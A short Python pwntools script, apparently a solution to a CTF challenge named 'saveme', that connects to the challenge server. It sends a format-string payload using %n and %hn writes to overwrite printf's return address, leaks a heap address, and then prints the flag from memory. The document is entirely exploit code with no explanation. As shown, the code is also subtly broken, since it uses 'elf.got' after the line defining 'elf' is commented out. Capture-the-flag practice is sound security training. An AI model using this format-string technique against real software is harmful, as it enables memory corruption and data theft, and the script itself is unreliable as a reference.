from pwn import *

p = remote('challs.ctf.sekai.team', 4001)
#p = process('./saveme_patched')
#elf = ELF('./saveme_patched')

stk_got = elf.got['__stack_chk_fail'] #404038
putc_got = elf.got['putc'] #404070

p.sendline(b'2')
p.recvuntil(b'gift: 0x')
buf_addr = unpack(unhex(p.recvuntil(b'|', drop=True).strip()), word_size=48, endian='big')
printf_ret = buf_addr - 0x18

payload  = b'%64p'
payload += b'%12$n'
payload += b'%5305p'
payload += b'%13$hn'
payload += b'%14$s'

payload += b'\x00'*(8-(len(payload)%8)) + p64(printf_ret+2) + p64(printf_ret) + p64(buf_addr-0xd0)

p.sendline(payload)
p.recvuntil(b'(nil)')
heap_addr = p.recv().strip()
print(heap_addr)
flag_addr = unpack(heap_addr, 'all', endian='little') - 0xc00

p.sendline(b'%9$s\x00\x00\x00\x00' + p64(flag_addr))
print(p.recvall())
